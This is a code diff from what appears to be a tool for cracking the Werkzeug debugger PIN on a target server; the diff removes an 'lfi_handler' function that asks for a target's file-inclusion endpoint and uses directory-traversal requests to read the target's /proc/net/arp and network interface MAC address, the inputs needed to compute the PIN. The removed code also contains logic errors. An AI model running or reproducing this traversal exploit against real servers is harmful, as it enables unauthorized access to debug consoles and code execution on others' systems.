@@ -144,27 +144,6 @@ def generate_pin(
 
     return rv 
 
-def lfi_handler(data: dict):
-    public_keys = (
-        "usernames",
-        "modnames",
-        "appnames",
-        "paths"
-    )
-    missing = []
-    for key, value in data:
-        if value == [""] and key in ("machine_id", "node_uuid"):
-            missing.append(key)
-        else:
-            # NOTE: Attempt to append the missisng data
-            vial.log.critical("Missing public bits. Please refer to the README.md and edit your config")
-            exit(1)
-
-    url = Prompt("Enter known LFI endpoint of target ")
-    base = "../../../../../../../../"
-    device_id = requests.get(url + base + "proc/net/arp").text
-    mac = requests.get(url + base + f"sys/class/net/{device_id}/address").text
-    print(device_id, mac)
 def pin_handler(config: str) -> bytes:
     """
     public_bits = [
